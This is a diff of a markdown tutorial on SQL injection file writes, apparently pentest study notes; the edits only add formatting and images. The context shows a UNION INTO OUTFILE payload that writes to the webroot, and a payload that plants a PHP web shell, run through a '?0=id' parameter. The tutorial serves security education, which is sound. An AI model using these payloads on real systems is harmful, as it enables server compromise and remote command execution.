@@ -108,17 +108,24 @@ like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's config
 or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using this wordlist for Linux
 or this wordlist for Windows. Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.
 
-The UNION injection payload would be as follows:
+__The UNION injection payload would be as follows:__
 ```sql
 X' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
 ```
+<p align="center">
+  <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/986026ab-a2a7-4e84-af8a-9a71c55c99a5" width="600" alt="Sublime's custom image"/>
+</p>
+
 
 
 We don’t see any errors on the page, which indicates that the query succeeded. Checking for the file `proof.txt` in the webroot, we see that it indeed exists:
 
+<p align="center">
+  <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/693cb6a8-d230-4a28-bc7b-e835a6052a21" width="500" alt="Sublime's custom image"/>
+</p>
 
 
-> Note: We see the string we dumped along with '1', '3' before it, and '4' after it. This is because the entire 'UNION' query result was written to the file. To make the output cleaner, we can use "" instead of numbers.
+> Note: We see the string we dumped along with '1', '3' before it, and '4' after it. This is because the entire 'UNION' query result was written to the file. __To make the output cleaner, we can use "" instead of numbers__.
 
 
 
@@ -139,7 +146,7 @@ X' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/w
   <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/9ed883ba-3ad9-4b8f-af4b-203929116094" width="600" alt="Sublime's custom image"/>
 </p>
 
-Once again, we don't see any errors, which means the file write probably worked. This can be verified by browsing to the /shell.php file and executing commands via the 0 parameter, with ?0=id in our URL:
+Once again, we don't see any errors, which means the file write probably worked. This can be verified by browsing to the `/shell.php` file and executing commands via the `0` parameter, with `?0=id` in our URL:
 
 
 <p align="center">
